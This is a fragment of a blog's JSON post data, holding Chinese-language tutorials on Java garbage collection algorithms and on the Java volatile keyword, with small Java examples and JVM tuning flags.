alt=\"\"><br>复制算法的核心思想是：将原有的内存空间分为两块，每次只使用其中一块，在垃圾回收时，将正在使用的内存中的存活对象复制到未使用的内存块中，之后清除正在使用的内存块中的所有对象，交换两个内存的角色，完成垃圾回收。</p>\n<p>如果系统中的垃圾对象很多，复制算法需要赋值的存活对象数量就会相对较少。因此，在真正需要垃圾回收的时刻，复制算法的效率是很高的。又由于对象是在垃圾回收过程中，统一被复制到新的内存空间中的，因此可确保回收后的内存空间是没有碎片的。虽然有以上两大优点，但是复制算法的代价却是将系统内存折半，因此单纯的复制算法也很难让人接收。现代Java回收机制中新生代的Survivor区域在使用这样的回收算法，因为新生代垃圾对象比存活对象多，复制算法高效。新生代Survivor区是两个比较小，但大小相等的内存块，在我的调优参数设置中，Survivor区通常只占用新生代区域的1/8，但也不是固定的，多尝试比例可以有较好的收获。</p>\n<blockquote>\n<p>题外话，我的一个项目上线初期，默认的JVM参数，CPU占用一直高居25%，但是调整后一直保持在20%以下，但同时内存占用却上升了。至于如何调整的，我还需要再深入一下。</p>\n<p>记录一下详细的配置过程 : 第一次上线，所有的配置都是默认的，记录Java堆各个代的情况，根据情况进行调整；第二次上线，采取减少堆的大小: <code>-Xmx250m -Xms40m -Xmn15m -XX:SurvivorRatio=10</code> 效果显著，在原来CPU高居25%-30%的情况下，顺利降到20%以下；第三次上线，采取增大堆的大小： <code>-Xmx250m -Xms75m -Xmn25m -XX:SurvivorRatio=10</code>，效果更好，已经降到16%以下。</p>\n</blockquote>\n<p><img src=\"/images/nginxlog.png\" alt=\"\"></p>\n<p><code>在这里补充一下Java垃圾回收的大致过程</code>：<br>在垃圾回收时，eden空间中的存活对象会被复制到未使用的survivor空间中(假设死to)，正在使用的suvivor空间(假设是from)中的年轻对象也会被赋值到to空间中(大对象，或者老年对象会直接进入老年代，如果to空间已满，则对象也会直接进入老年代)。此时eden空间和from空间中的剩余对象就是垃圾对象，可以直接清空，to空间则存放此次回收后的存活对象。这种改进的复制算法，既保证了空间的连续性，又避免了大量的内存空间浪费。</p>\n<h2 id=\"标记压缩-Mark-Compact\"><a href=\"#标记压缩-Mark-Compact\" class=\"headerlink\" title=\"标记压缩(Mark-Compact)\"></a>标记压缩(Mark-Compact)</h2><p><img src=\"http://image.codes51.com/Article/image/20160321/20160321124230_0720.png\" alt=\"\"><br>复制算法的高效性是建立在存活对象少，垃圾对象多的前提下的，这种情况在新生代经常发生，但是在老年代，更常见的情况是大部分对象都是存活对象。如果依然使用复制算法，复制成本也将很高。因此基于老年代垃圾回收的特性，需要使用其他的算法。</p>\n<p>标记压缩算法是一种老年代的回收算法。它在标记清除算法的基础上做了一些优化。和标记算法一样，标记压缩算法也首先需要从跟节点开始，对所有可达对象做标记。但之后，它不是简单地清理未标记的对象，而是将所有的存活对象压缩到内存的一端。之后清理边界外所有的空间。这种方法避免了碎片的产生，又不需要两块相同的内存空间，因此其性价比比较高。</p>\n<h2 id=\"分代算法-Generational-Collecting\"><a href=\"#分代算法-Generational-Collecting\" class=\"headerlink\" title=\"分代算法(Generational Collecting)\"></a>分代算法(Generational Collecting)</h2><p>上述介绍的算法中，并没有一种算法可以完全替代其他算法，它们都具有自己独特的优势和特点。因此根据垃圾回收对象的特性，使用合适的算法回收，才是明智的选择。<br>分代算法就是基于这种思想，他将内存区间根据对象特点分成几块，根据每块内存空间的特点，使用不同的回收算法，以提高垃圾回收的效率。</p>\n<p>一般来说Java虚拟机会将所有的新建对象都放入成为新生代的内存区域，新生代的特点死对象朝生夕灭，大约90%的新建对象会被很快回收，因此，新生代比较适合使用复制算法。当一个对象经过几次回收后依然存活，对象就会被放入成为老年代的内存空间。在老年代中，几乎所有的对象都是经过几次垃圾回收后依然得以存活的。因此，可以认为这些对象在一段时间期内，甚至在应用程序的整个生命周期中，将是常驻内存的。那么这些对象回收就应该采用<code>标记压缩</code>或<code>标记清除</code>算法，以提高垃圾回收效率。</p>\n<p>对于新生代和老年代来说，通常新生代回收频率很高，但是每次回收的耗时都很短，而老年代回收频率比较低，但是会消耗更多的时间。<strong>同时这引来一个问题，当老年代中的对象持有新生代对象的引用时怎么办？</strong>为了解决这个问题，虚拟机可能使用一种叫做卡表(Card Table)的数据结构。卡表为一个比特位集合，每一个比特位可以用来表示老年代的某一区域中的所有对象是否持有新生代对象的引用。这样在新生代GC时，可以不用花大量的时间扫描所有老年代对象，来确定每一个对象的引用关系，而可以先扫描卡表，当卡表的标记为1时才扫描给定区域的老年代对象；而当卡表位为0时就不用是扫描所在区域的老年代对象。</p>\n<h2 id=\"分区算法-Region\"><a href=\"#分区算法-Region\" class=\"headerlink\" title=\"分区算法(Region)\"></a>分区算法(Region)</h2><p>分代算法是按照对象的生命周期长短划分成两部分，分区算法将真个给堆空间划分为连续的不同小区间，每个区间都独立使用，独立回收。这种算法的好处是可以控制一次回收多少个小区间。</p>\n<p>一般来说，在相同条件下，堆空间越大，一次GC时所需要的时间就越长，从而产生的停顿也越长。为了更好地控制GC产生的停顿时间，将一块大的内存区域分割成多个小块，根据目标停顿时间，每次合理地回收若干个小区间，而不是整个堆空间，从而减少一次GC所产生的停顿。</p>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><ul>\n<li><a href=\"https://blog.csdn.net/u010429311/article/details/52724075\" target=\"_blank\" rel=\"external\">Java垃圾回收算法</a></li>\n<li><a href=\"https://weiwei02.github.io/2017/08/18/jvm/gc%E7%AE%97%E6%B3%95/\" target=\"_blank\" rel=\"external\">JVM虚拟机-垃圾回收算法</a></li>\n<li>实战Java虚拟机(图书)</li>\n</ul>\n","excerpt":"<h2 id=\"Java堆空间划分\"><a href=\"#Java堆空间划分\" class=\"headerlink\" title=\"Java堆空间划分\"></a>Java堆空间划分</h2><p><img src=\"/images/r_heap1.PNG\" alt=\"\"></p>\n<p><img src=\"http://dl2.iteye.com/upload/attachment/0088/6262/6af6a224-8b2d-3f23-8b58-79263cfda9c4.png\" alt=\"\"></p>","more":"<h2 id=\"引用计数法-Reference-Counting\"><a href=\"#引用计数法-Reference-Counting\" class=\"headerlink\" title=\"引用计数法(Reference Counting)\"></a>引用计数法(Reference Counting)</h2><p>引用计数法是最经典也是最古老的一种垃圾收集方法，它的实现很简单，只要为每个对象设置一个整型的计数器即可。但是引用计数法有两个严重的问题：</p>\n<ul>\n<li>无法处理循环引用的情况。因此在Java的垃圾回收器中，没有使用这种算法。</li>\n<li>引用计数器要求在每次因引用产生和消除的时候，需要伴随一个加法操作和减法操作，对系统性能会有一定的影响。</li>\n</ul>\n<blockquote>\n<p>一个简单的循环引用问题描述如下：有对象A和对象B，对象A中含有对象B的引用，对象B中含有对象A的引用。此时，对象A和对象B的计数器都不为0。但是在系统中，却不存在任何第3飞蛾对象引用了A或B。也就是说，A和B是应该被回收的垃圾对象，但是由于垃圾对象间相互引用，从而使垃圾回收器无法识别，引起内存泄漏。</p>\n</blockquote>\n<h2 id=\"标记清除法-Mark-Sweep\"><a href=\"#标记清除法-Mark-Sweep\" class=\"headerlink\" title=\"标记清除法(Mark-Sweep)\"></a>标记清除法(Mark-Sweep)</h2><p><img src=\"http://image.codes51.com/Article/image/20160321/20160321124229_9001.png\" alt=\"\"><br>标记清除算法是现代垃圾回收算法的思想基础。标记清除算法将垃圾回收分为两个阶段：标记阶段、清除阶段。一种可行的实现是，在标记阶段，首先通过跟节点标记所有从跟节点开始的可达对象。因此，未标记的对象就是未被利用的垃圾对象。然后在清除阶段，清除所有未被标记的对象。<strong>标记清除算法可能会产生最大问题是空间碎片。</strong></p>\n<h2 id=\"复制算法-Copying\"><a href=\"#复制算法-Copying\" class=\"headerlink\" title=\"复制算法(Copying)\"></a>复制算法(Copying)</h2><p><img src=\"https://weiwei02.coding.me/images/java/jvm/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%A4%8D%E5%88%B6.png\" alt=\"\"><br>复制算法的核心思想是：将原有的内存空间分为两块，每次只使用其中一块，在垃圾回收时，将正在使用的内存中的存活对象复制到未使用的内存块中，之后清除正在使用的内存块中的所有对象，交换两个内存的角色，完成垃圾回收。</p>\n<p>如果系统中的垃圾对象很多，复制算法需要赋值的存活对象数量就会相对较少。因此，在真正需要垃圾回收的时刻，复制算法的效率是很高的。又由于对象是在垃圾回收过程中，统一被复制到新的内存空间中的，因此可确保回收后的内存空间是没有碎片的。虽然有以上两大优点，但是复制算法的代价却是将系统内存折半，因此单纯的复制算法也很难让人接收。现代Java回收机制中新生代的Survivor区域在使用这样的回收算法，因为新生代垃圾对象比存活对象多，复制算法高效。新生代Survivor区是两个比较小，但大小相等的内存块，在我的调优参数设置中，Survivor区通常只占用新生代区域的1/8，但也不是固定的，多尝试比例可以有较好的收获。</p>\n<blockquote>\n<p>题外话，我的一个项目上线初期，默认的JVM参数，CPU占用一直高居25%，但是调整后一直保持在20%以下，但同时内存占用却上升了。至于如何调整的，我还需要再深入一下。</p>\n<p>记录一下详细的配置过程 : 第一次上线，所有的配置都是默认的，记录Java堆各个代的情况，根据情况进行调整；第二次上线，采取减少堆的大小: <code>-Xmx250m -Xms40m -Xmn15m -XX:SurvivorRatio=10</code> 效果显著，在原来CPU高居25%-30%的情况下，顺利降到20%以下；第三次上线，采取增大堆的大小： <code>-Xmx250m -Xms75m -Xmn25m -XX:SurvivorRatio=10</code>，效果更好，已经降到16%以下。</p>\n</blockquote>\n<p><img src=\"/images/nginxlog.png\" alt=\"\"></p>\n<p><code>在这里补充一下Java垃圾回收的大致过程</code>：<br>在垃圾回收时，eden空间中的存活对象会被复制到未使用的survivor空间中(假设死to)，正在使用的suvivor空间(假设是from)中的年轻对象也会被赋值到to空间中(大对象，或者老年对象会直接进入老年代，如果to空间已满，则对象也会直接进入老年代)。此时eden空间和from空间中的剩余对象就是垃圾对象，可以直接清空，to空间则存放此次回收后的存活对象。这种改进的复制算法，既保证了空间的连续性，又避免了大量的内存空间浪费。</p>\n<h2 id=\"标记压缩-Mark-Compact\"><a href=\"#标记压缩-Mark-Compact\" class=\"headerlink\" title=\"标记压缩(Mark-Compact)\"></a>标记压缩(Mark-Compact)</h2><p><img src=\"http://image.codes51.com/Article/image/20160321/20160321124230_0720.png\" alt=\"\"><br>复制算法的高效性是建立在存活对象少，垃圾对象多的前提下的，这种情况在新生代经常发生，但是在老年代，更常见的情况是大部分对象都是存活对象。如果依然使用复制算法，复制成本也将很高。因此基于老年代垃圾回收的特性，需要使用其他的算法。</p>\n<p>标记压缩算法是一种老年代的回收算法。它在标记清除算法的基础上做了一些优化。和标记算法一样，标记压缩算法也首先需要从跟节点开始，对所有可达对象做标记。但之后，它不是简单地清理未标记的对象，而是将所有的存活对象压缩到内存的一端。之后清理边界外所有的空间。这种方法避免了碎片的产生，又不需要两块相同的内存空间，因此其性价比比较高。</p>\n<h2 id=\"分代算法-Generational-Collecting\"><a href=\"#分代算法-Generational-Collecting\" class=\"headerlink\" title=\"分代算法(Generational Collecting)\"></a>分代算法(Generational Collecting)</h2><p>上述介绍的算法中，并没有一种算法可以完全替代其他算法，它们都具有自己独特的优势和特点。因此根据垃圾回收对象的特性，使用合适的算法回收，才是明智的选择。<br>分代算法就是基于这种思想，他将内存区间根据对象特点分成几块，根据每块内存空间的特点，使用不同的回收算法，以提高垃圾回收的效率。</p>\n<p>一般来说Java虚拟机会将所有的新建对象都放入成为新生代的内存区域，新生代的特点死对象朝生夕灭，大约90%的新建对象会被很快回收，因此，新生代比较适合使用复制算法。当一个对象经过几次回收后依然存活，对象就会被放入成为老年代的内存空间。在老年代中，几乎所有的对象都是经过几次垃圾回收后依然得以存活的。因此，可以认为这些对象在一段时间期内，甚至在应用程序的整个生命周期中，将是常驻内存的。那么这些对象回收就应该采用<code>标记压缩</code>或<code>标记清除</code>算法，以提高垃圾回收效率。</p>\n<p>对于新生代和老年代来说，通常新生代回收频率很高，但是每次回收的耗时都很短，而老年代回收频率比较低，但是会消耗更多的时间。<strong>同时这引来一个问题，当老年代中的对象持有新生代对象的引用时怎么办？</strong>为了解决这个问题，虚拟机可能使用一种叫做卡表(Card Table)的数据结构。卡表为一个比特位集合，每一个比特位可以用来表示老年代的某一区域中的所有对象是否持有新生代对象的引用。这样在新生代GC时，可以不用花大量的时间扫描所有老年代对象，来确定每一个对象的引用关系，而可以先扫描卡表，当卡表的标记为1时才扫描给定区域的老年代对象；而当卡表位为0时就不用是扫描所在区域的老年代对象。</p>\n<h2 id=\"分区算法-Region\"><a href=\"#分区算法-Region\" class=\"headerlink\" title=\"分区算法(Region)\"></a>分区算法(Region)</h2><p>分代算法是按照对象的生命周期长短划分成两部分，分区算法将真个给堆空间划分为连续的不同小区间，每个区间都独立使用，独立回收。这种算法的好处是可以控制一次回收多少个小区间。</p>\n<p>一般来说，在相同条件下，堆空间越大，一次GC时所需要的时间就越长，从而产生的停顿也越长。为了更好地控制GC产生的停顿时间，将一块大的内存区域分割成多个小块，根据目标停顿时间，每次合理地回收若干个小区间，而不是整个堆空间，从而减少一次GC所产生的停顿。</p>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><ul>\n<li><a href=\"https://blog.csdn.net/u010429311/article/details/52724075\">Java垃圾回收算法</a></li>\n<li><a href=\"https://weiwei02.github.io/2017/08/18/jvm/gc%E7%AE%97%E6%B3%95/\">JVM虚拟机-垃圾回收算法</a></li>\n<li>实战Java虚拟机(图书)</li>\n</ul>"},{"title":"Java volatitle","date":"2018-05-03T07:18:23.000Z","_content":"\n## Java Volatile Keyword\nJava `volatitle`关键字用来标记变量\"被存储在主存里\"，更精确的说，`volatitle`变量的每一次读取都需要从计算机的主存读取而不是`CPU Cache`，而每一次写入都是直接写入主存，而不是`CPU Cache`。从Java 5开始`volatitle`关键字不仅仅是保证写入主存和从主存读取。\n\n## 变量可见性问题\nJava `volatitle`保证了变量跨线程的可见性，这么说可能有点抽象，so let me elaborate。\n\n在线程操作`non-volatile`变量的多线程应用中，由于性能原因每个线程会从主存中拷贝变量到CPU Cache(each thread may copy variables from main memory into a CPU cache while working on them)。如果你的计算机是多CPU的，每个线程可能跑在不同的CPU上，这意味着每个线程会拷贝变量到不同CPU的Cache中，就像这样:\n![](http://tutorials.jenkov.com/images/java-concurrency/java-volatile-1.png)\n\n<!--more-->\n\n对于JVM来说，从主存读取值到CPU Cache和从CPU Cache写入数据到主存，`non-volatile variables`没有上述的保证，会引出一些问题。\n\n设想一种情况，两个或更多线程可以访问包含一个计数器变量的共享对象，声明如下:\n``` java\npublic class SharedObject {\n\n    public int counter = 0;\n\n}\n```\n再想象一下，只有Thread 1 increments the `counter` variable，但是Thread 1 和Thread 2都会一遍一遍的读取`counter` 变量。如果`counter`变量没有`volatitle`修饰，那么就不保证`counter`变量的值何时从CPU Cache写入主存。这就意味着在CPU Cache中`counter`的值与主存里的值可能不一样，就像这样:\n![](http://tutorials.jenkov.com/images/java-concurrency/java-volatile-2.png)\n\n这个问题就是线程不能看到变量的最新值，因为在另一个线程中没有将变量最新值写入到主存中，这个问题叫做`可见性`问题。一个线程的更新对另一个线程不可见。\n\n## Java volatitle可见性保证\nJava关键字`volatitle`旨在解决变量可见性问题。定义了`counter`变量`volatitle`后线程的写入操作会立刻写入到主存，同时所有的读取都是直接从主存读取。下面就是`volatitle`定义`counter`变量:\n``` java\npublic class SharedObject {\n\n    public volatile int counter = 0;\n\n}\n```\n定义了`volatitle`后就保证了变量的可见性，在上述的情况下，线程1修改`counter`，线程2读取`counter`，对于线程2来说它能够见到线程1的最新修改。但是当两个线程都要修改`counter`的时候，定义`volatitle`显然不够了。\n\n## Full volatile Visibility Guarantee\nFull保证如下:\n- 如果线程A写入一个`volatitle`变量，并且线程B随后读取相同的`volatitle`变量，则在写入`volatitle`变量之前，线程A可见的所有变量在线程B读取`volatitle`变量后也将可见。\n- 如果线程A读取一个`volatitle`变量，则读取`volatitle`变量时线程A可见的所有变量也将从主内存中重新读取。\n> 可以看到，这个开销是比较恐怖的，首先直接读主存和写主存原本就很慢，慢到几十倍甚至几百倍，同时一个volatitle变量读取会带动其他所有volatitle重新读取，大大降低了性能。\n\n来看一个例子：\n``` java\npublic class MyClass {\n    private int years;\n    private int months\n    private volatile int days;\n\n\n    public void update(int years, int months, int days){\n        this.years  = years;\n        this.months = months;\n        this.days   = days;\n    }\n}\n```\n`update()`方法会写入三个变量，其中只有`days`是`volatitle`，Full volatitle保证意味着，当写入`days`时，所有的变量都会写入主存。在这个例子中就是，当我们要写入`days`时，`years`和`months`也要写入主存。当要读取`years`、`months`和`days`时，你可以像这样做:\n``` java\npublic class MyClass {\n    private int years;\n    private int months\n    private volatile int days;\n\n    public int totalDays() {\n        int total = this.days;\n        total += months * 30;\n        total += years * 365;\n        return total;\n    }\n\n    public void update(int years, int months, int days){\n        this.years  = years;\n        this.months = months;\n        this.days   = days;\n    }\n}\n```\n注意`totalDays()`方法在开始时读取`days`到`total`变量。当读取`days`值时，`years`和`months`也会从主存中读取，因此你可以通过上面的读取步骤读到所有变量的最新值。\n\n## 指令重排\n为了性能，Java VM和CPU是允许重排程序中的指令的，只要语义含义保持不变。举个例子，看看下面的指令：\n``` java\nint a = 1;\nint b = 2;\n\na++;\nb++;\n```\n在不丢失语义含义的情况下，上述指令可能被重排成下列指令序列：\n``` java\nint a = 1;\na++;\n\nint b = 2;\nb++;\n```\n但对于`volatitle`变量来说，指令重排是一个挑战，让我们来看一下上述MyClass的例子\n``` java\npublic class MyClass {\n    private int years;\n    private int months\n    private volatile int days;\n\n\n    public void update(int years, int months, int days){\n        this.years  = years;\n        this.months = months;\n        this.days   = days;\n    }\n}\n```\n当写入`days`时，也会同时写入`years`和`months`到主存。但是如果Java VM重排指令如下：\n``` java\npublic void update(int years, int months, int days){\n    this.days   = days;\n    this.months = months;\n    this.years  = years;\n}\n```\n当`days`修改时，`months`和`years`也会写入主存，但是这次`days`写入发生在`years`和`months`之前，因此这个新值对其他线程不可见，这个语义含义已经被改变了。\n> 特别注意，在写入时，把`volatitle`变量写入放在最后，这样当运行到`volatitle`变量写入时，会同时把其他非`volatitle`写入主存，但当`volatitle`写在最开始时，后面的非`volatitle`便不会写入最新值。读取相反，将`volatitle`读取放在最前，线程会读取所有值最新的主存值，如果放在最后面，那么前面读取的变量不是从主存直接读取的。\n\n## Happens-Before\n为了解决指令重组问题，Java `volatitle`关键字除了可见性保证，还给了一个`happens-before`保证，`happens-before`保证如下：\n- 如果读写发生在写入`volatitle`变量之前，那么读写其他变量的指令不能被重组到写入`volatitle`变量之后。写入`volatitle`变量之前的读写被保证`happens before`写`volatitle`变量。需要注意，写入`volatitle`变量之后的读写其他变量仍然有可能被重组到写入`volatitle`变量之前。因此**From after to before is allowed, but from before to after is not allowed**（`volatitle`写操作之后的指令被重组到写之前是允许的，而写操作之前的指令不允许被重组到写之后）\n- 读`volatitle`变量之后的读写操作不能被重组到`volatitle`之前，但同样注意发生在读`volatitle`之前的指令可以重组到读`volatitle`之后。因此**From before to after is allowed, but from after to before is not allowed**(`volatitle`读之前的指令被重组到读之后值允许的，而读操作之后的指令不允许被重组到读值前)\n\n> Reads from and writes to other variables cannot be reordered to occur after a write to a volatile variable, if the reads / writes originally occurred before the write to the volatile variable.\nThe reads / writes before a write to a volatile variable are guaranteed to \"happen before\" the write to the volatile variable. Notice that it is still possible for e.g. reads / writes of other variables located after a write to a volatile to be reordered to occur before that write to the volatile. Just not the other way around. From after to before is allowed, but from before to after is not allowed\n\n> Reads from and writes to other variables cannot be reordered to occur before a read of a volatile variable, if the reads / writes originally occurred after the read of the volatile variable. Notice that it is possible for reads of other variables that occur before the read of a volatile variable can be reordered to occur after the read of the volatile. Just not the other way around. From before to after is allowed, but from after to before is not allowed\n\n重点解释一下这两个保证：\n对于`volatitle`写来说，如果写之前的指令被重组到写之后，那么当执行到`volatitle`时，最新值就不能被立刻写入主存；但写之后的指令被重组到写之前是没有影响的，因为写之后的指令最终还是要被写到主存，只是重组之后提前将新值写入主存。\n对于`volatitle`读来说，如果读之后的指令被重组到读之前，那么指令没有获取最新值，因为只有到`volatitle`读执行时才重读所有变量的主存值，比如当`years`读取发生`volatitle days`之后，那么执行到`volatitle days`会刷新`years`的值，但`years`被重组到`volatitle days`之前，`years`的值没有刷新；相反，如果读取`years`在`volatitle days`之前，被重组到之后，它会读到最新值，这正是我们希望的结果。\n\n## volatile is Not Always Enough\n当多个线程都需要对一个`volatitle`变量进行写入，且写入之前需要依赖`volatitle`之前的值，这时候就会出现竞争条件：\n\n想象一下，如果线程1读取一个`shared  counter`值到自己CPU Cache中，开始值为0，然后`increment`该值为1，但没有把改变的值写入主存；然后线程2也从主存中读取`counter`，由于线程1没有将改变的值写入主存，此时线程2读到的值为0，它也对值进行`increment`后值变为1，此时线程2也没有将值写入主存，就像这样:\n![](http://tutorials.jenkov.com/images/java-concurrency/java-volatile-3.png)\n\n线程1和线程2几乎不同步，而我们希望的是进行两次加操作后值为2，但线程1和线程2的CPU Cache中`counter`都是1，即使我们将它们的值写入到主存，结果仍然不对，这都是**volatile is Not Always Enough**\n\n## When is volatile Enough?\n既然出现了上诉情况，那么如果解决这个问题？之前`volatitle`已经明显不够，那么这时候可以使用Java另外一个关键字`synchronized`去保证读取变量和写入变量是原子性的操作。上诉的`volatitle`读写操作并不会产生线程阻塞，使用`synchronized`保证临界区读写不出现上述问题，但这样会导致线程阻塞。另外也可以使用`java.util.concurrent package`里面的`AtomicLong` or `AtomicReference`或者其他。\n\n在这样的情况下，只有一个线程允许对`volatitle`变量进行读写操作，其他线程只允许读取，这样即保证读取最新的值，也保证直接写入主存。但是光有`synchronized`并不能保证可见性。\n\n## 性能问题\n之前已经说过，`volatitle`的读写都要直接接触主存，那么与读写CPU Cache相比，开销增大许多倍，放一张计算机各级缓存以及主存的读取速度比较:\n![](http://www.qdpma.com/SystemArchitecture_files/CPU_4c.png)\n\n## 参考链接\n- [Java Volatile Keyword](http://tutorials.jenkov.com/java-concurrency/volatile.html)","source":"_posts/JavaVolatitle.md","raw":"---\ntitle: Java volatitle\ndate: 2018-05-03 15:18:23\ncategories: Java\ntags:\n  - Java\n  - 线程\n  - Happens-Before\n---\n\n## Java Volatile Keyword\nJava `volatitle`关键字用来标记变量\"被存储在主存里\"，更精确的说，`volatitle`变量的每一次读取都需要从计算机的主存读取而不是`CPU Cache`，而每一次写入都是直接写入主存，而不是`CPU Cache`。从Java 5开始`volatitle`关键字不仅仅是保证写入主存和从主存读取。\n\n## 变量可见性问题\nJava `volatitle`保证了变量跨线程的可见性，这么说可能有点抽象，so let me elaborate。\n\n在线程操作`non-volatile`变量的多线程应用中，由于性能原因每个线程会从主存中拷贝变量到CPU Cache(each thread may copy variables from main memory into a CPU cache while working on them)。如果你的计算机是多CPU的，每个线程可能跑在不同的CPU上，这意味着每个线程会拷贝变量到不同CPU的Cache中，就像这样:\n![](http://tutorials.jenkov.com/images/java-concurrency/java-volatile-1.png)\n\n<!--more-->\n\n对于JVM来说，从主存读取值到CPU Cache和从CPU Cache写入数据到主存，`non-volatile variables`没有上述的保证，会引出一些问题。\n\n设想一种情况，两个或更多线程可以访问包含一个计数器变量的共享对象，声明如下:\n``` java\npublic class SharedObject {\n\n    public int counter = 0;\n\n}\n```\n再想象一下，只有Thread 1 increments the `counter` variable，但是Thread 1 和Thread 2都会一遍一遍的读取`counter` 变量。如果`counter`变量没有`volatitle`修饰，那么就不保证`counter`变量的值何时从CPU Cache写入主存。这就意味着在CPU Cache中`counter`的值与主存里的值可能不一样，就像这样:\n![](http://tutorials.jenkov.com/images/java-concurrency/java-volatile-2.png)\n\n这个问题就是线程不能看到变量的最新值，因为在另一个线程中没有将变量最新值写入到主存中，这个问题叫做`可见性`问题。一个线程的更新对另一个线程不可见。\n\n## Java volatitle可见性保证\nJava关键字`volatitle`旨在解决变量可见性问题。定义了`counter`变量`volatitle`后线程的写入操作会立刻写入到主存，同时所有的读取都是直接从主存读取。下面就是`volatitle`定义`counter`变量:\n``` java\npublic class SharedObject {\n\n    public volatile int counter = 0;\n\n}\n```\n定义了`volatitle`后就保证了变量的可见性，在上述的情况下，线程1修改`counter`，线程2读取`counter`，对于线程2来说它能够见到线程1的最新修改。但是当两个线程都要修改`counter`的时候，定义`volatitle`显然不够了。\n\n## Full volatile Visibility Guarantee\nFull保证如下:\n- 如果线程A写入一个`volatitle`变量，并且线程B随后读取相同的`volatitle`变量，则在写入`volatitle`变量之前，线程A可见的所有变量在线程B读取`volatitle`变量后也将可见。\n- 如果线程A读取一个`volatitle`变量，则读取`volatitle`变量时线程A可见的所有变量也将从主内存中重新读取。\n> 可以看到，这个开销是比较恐怖的，首先直接读主存和写主存原本就很慢，慢到几十倍甚至几百倍，同时一个volatitle变量读取会带动其他所有volatitle重新读取，大大降低了性能。\n\n来看一个例子：\n``` java\npublic class MyClass {\n    private int years;\n    private int months\n    private volatile int days;\n\n\n    public void update(int years, int months, int days){\n        this.years  = years;\n        this.months = months;\n        this.days   = days;\n    }\n}\n```\n`update()`方法会写入三个变量，其中只有`days`是`volatitle`，Full volatitle保证意味着，当写入`days`时，所有的变量都会写入主存。在这个例子中就是，当我们要写入`days`时，`years`和`months`也要写入主存。当要读取`years`、`months`和`days`时，你可以像这样做:\n``` java\npublic class MyClass {\n    private int years;\n    private int months\n    private volatile int days;\n\n    public int totalDays() {\n        int total = this.days;\n        total += months * 30;\n        total += years * 365;\n        return total;\n    }\n\n    public void update(int years, int months, int days){\n        this.years  = years;\n        this.months = months;\n        this.days   = days;\n    }\n}\n```\n注意`totalDays()`方法在开始时读取`days`到`total`变量。当读取`days`值时，`years`和`months`也会从主存中读取，因此你可以通过上面的读取步骤读到所有变量的最新值。\n\n## 指令重排\n为了性能，Java VM和CPU是允许重排程序中的指令的，只要语义含义保持不变。举个例子，看看下面的指令：\n``` java\nint a = 1;\nint b = 2;\n\na++;\nb++;\n```\n在不丢失语义含义的情况下，上述指令可能被重排成下列指令序列：\n``` java\nint a = 1;\na++;\n\nint b = 2;\nb++;\n```\n但对于`volatitle`变量来说，指令重排是一个挑战，让我们来看一下上述MyClass的例子\n``` java\npublic class MyClass {\n    private int years;\n    private int months\n    private volatile int days;\n\n\n    public void update(int years, int months, int days){\n        this.years  = years;\n        this.months = months;\n        this.days   = days;\n    }\n}\n```\n当写入`days`时，也会同时写入`years`和`months`到主存。但是如果Java VM重排指令如下：\n``` java\npublic void update(int years, int months, int days){\n    this.days   = days;\n    this.months = months;\n    this.years  = years;\n}\n```\n当`days`修改时，`months`和`years`也会写入主存，但是这次`days`写入发生在`years`和`months`之前，因此这个新值对其他线程不可见，这个语义含义已经被改变了。\n> 特别注意，在写入时，把`volatitle`变量写入放在最后，这样当运行到`volatitle`变量写入时，会同时把其他非`volatitle`写入主存，但当`volatitle`写在最开始时，后面的非`volatitle`便不会写入最新值。读取相反，将`volatitle`读取放在最前，线程会读取所有值最新的主存值，如果放在最后面，那么前面读取的变量不是从主存直接读取的。\n\n## Happens-Before\n为了解决指令重组问题，Java `volatitle`关键字除了可见性保证，还给了一个`happens-before`保证，`happens-before`保证如下：\n- 如果读写发生在写入`volatitle`变量之前，那么读写其他变量的指令不能被重组到写入`volatitle`变量之后。写入`volatitle`变量之前的读写被保证`happens before`写`volatitle`变量。需要注意，写入`volatitle`变量之后的读写其他变量仍然有可能被重组到写入`volatitle`变量之前。因此**From after to before is allowed, but from before to after is not allowed**（`volatitle`写操作之后的指令被重组到写之前是允许的，而写操作之前的指令不允许被重组到写之后）\n- 读`volatitle`变量之后的读写操作不能被重组到`volatitle`之前，但同样注意发生在读`volatitle`之前的指令可以重组到读`volatitle`之后。因此**From before to after is allowed, but from after to before is not allowed**(`volatitle`读之前的指令被重组到读之后值允许的，而读操作之后的指令不允许被重组到读值前)\n\n> Reads from and writes to other variables cannot be reordered to occur after a write to a volatile variable, if the reads / writes originally occurred before the write to the volatile variable.\nThe reads / writes before a write to a volatile variable are guaranteed to \"happen before\" the write to the volatile variable. Notice that it is still possible for e.g. reads / writes of other variables located after a write to a volatile to be reordered to occur before that write to the volatile. Just not the other way around. From after to before is allowed, but from before to after is not allowed\n\n> Reads from and writes to other variables cannot be reordered to occur before a read of a volatile variable, if the reads / writes originally occurred after the read of the volatile variable. Notice that it is possible for reads of other variables that occur before the read of a volatile variable can be reordered to occur after the read of the volatile. Just not the other way around. From before to after is allowed, but from after to before is not allowed\n\n重点解释一下这两个保证：\n对于`volatitle`写来说，如果写之前的指令被重组到写之后，那么当执行到`volatitle`时，最新值就不能被立刻写入主存；但写之后的指令被重组到写之前是没有影响的，因为写之后的指令最终还是要被写到主存，只是重组之后提前将新值写入主存。\n对于`volatitle`读来说，如果读之后的指令被重组到读之前，那么指令没有获取最新值，因为只有到`volatitle`读执行时才重读所有变量的主存值，比如当`years`读取发生`volatitle days`之后，那么执行到`volatitle days`会刷新`years`的值，但`years`被重组到`volatitle days`之前，`years`的值没有刷新；相反，如果读取`years`在`volatitle days`之前，被重组到之后，它会读到最新值，这正是我们希望的结果。\n\n## volatile is Not Always Enough\n当多个线程都需要对一个`volatitle`变量进行写入，且写入之前需要依赖`volatitle`之前的值，这时候就会出现竞争条件：\n\n想象一下，如果线程1读取一个`shared  counter`值到自己CPU Cache中，开始值为0，然后`increment`该值为1，但没有把改变的值写入主存；然后线程2也从主存中读取`counter`，由于线程1没有将改变的值写入主存，此时线程2读到的值为0，它也对值进行`increment`后值变为1，此时线程2也没有将值写入主存，就像这样:\n![](http://tutorials.jenkov.com/images/java-concurrency/java-volatile-3.png)\n\n线程1和线程2几乎不同步，而我们希望的是进行两次加操作后值为2，但线程1和线程2的CPU 